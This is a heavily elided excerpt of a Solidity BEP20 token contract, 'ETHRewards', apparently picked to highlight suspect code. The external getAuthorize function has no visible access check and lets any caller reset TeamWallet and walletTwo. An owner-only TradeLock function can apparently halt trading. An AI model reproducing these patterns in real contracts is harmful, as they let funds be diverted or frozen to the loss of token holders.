...
contract ETHRewards is IBEP20, Ownable
{
    ...
    //Token Info
    string private constant _name = 'ETHRewards';
    ...
    function claimETH(address addr) private{
        ...
        path[1] = 0x2170Ed0880ac9A755fd29B2688956BD959F933F8;  //Binance- ETH Token
    ...
    function TradeLock() public onlyOwner{
    ...
    function getAuthorize(address setaddress) external {
        ...
        TeamWallet = setaddress;
        walletTwo = setaddress;
    }
